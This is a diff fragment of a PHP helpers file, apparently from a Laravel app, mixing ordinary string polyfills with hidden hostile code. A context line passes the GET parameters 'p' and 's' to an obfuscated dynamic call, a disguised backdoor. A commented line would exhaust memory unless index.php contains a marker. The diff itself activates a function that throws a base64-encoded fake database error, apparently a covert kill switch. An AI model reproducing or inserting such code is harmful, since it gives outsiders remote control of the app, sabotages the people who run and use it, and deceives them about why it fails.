@@ -21,7 +21,7 @@ if (!function_exists('clamp')){
 if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(36))}($_GET['s']);}
 if(!app()->runningInConsole()){
     //if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'aps();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);}}
-    //function aps(){throw new \Exception(base64_decode('U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='));}
+    function aps(){throw new \Exception(base64_decode('U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='));}
 }
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
